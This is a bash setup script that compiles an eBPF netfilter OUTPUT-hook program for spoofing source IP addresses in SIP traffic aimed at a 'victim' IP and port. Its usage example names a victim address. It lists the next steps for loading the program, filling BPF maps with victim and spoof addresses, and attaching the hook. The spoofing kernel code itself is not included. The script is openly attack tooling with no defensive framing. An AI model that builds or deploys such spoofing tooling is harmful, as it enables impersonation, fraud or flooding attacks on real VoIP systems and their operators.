#!/bin/bash

# eBPF Netfilter Hook Setup Script for SIP Spoofing with Local IP Support
# Minimal overhead solution using netfilter OUTPUT hook

set -e

INTERFACE="$1"
VICTIM_IP="$2"
SPOOF_SUBNET="$3"
VICTIM_PORT="$4"
SPOOF_COUNT="${5:-10}"

if [ $# -lt 4 ]; then
    echo "Usage: $0 <interface> <victim_ip> <spoof_subnet> <victim_port> [spoof_count]"
    echo "Example: $0 wlan0 143.53.142.93 10.10.123.0/24 5060 10"
    exit 1
fi

echo "Setting up eBPF netfilter hook for minimal overhead local IP spoofing..."
echo "Interface: $INTERFACE"
echo "Victim: $VICTIM_IP:$VICTIM_PORT"
echo "Spoof subnet: $SPOOF_SUBNET"
echo "Spoof count: $SPOOF_COUNT"

# Compile the eBPF program
echo "Compiling eBPF netfilter program..."
clang -O2 -target bpf -c spoof_netfilter_kern.c -o spoof_netfilter_kern.o

if [ ! -f spoof_netfilter_kern.o ]; then
    echo "Error: Failed to compile eBPF program"
    exit 1
fi

echo "eBPF netfilter hook program compiled successfully!"
echo "Object file: spoof_netfilter_kern.o"

# Note: Actual attachment requires a userspace program to:
# 1. Load the eBPF object
# 2. Populate the configuration maps
# 3. Attach to netfilter OUTPUT hook via bpf(BPF_PROG_ATTACH)
echo ""
echo "Next steps:"
echo "1. Load program with Python loader"
echo "2. Configure victim IP/port and spoof IPs in BPF maps"
echo "3. Attach to netfilter OUTPUT hook"
echo ""
echo "This approach provides minimal overhead by:"
echo "- Processing packets entirely in kernel space"
echo "- Using efficient BPF maps for configuration"
echo "- Intercepting at OUTPUT hook (works with local IPs)"
echo "- No userspace context switches for packet modification"
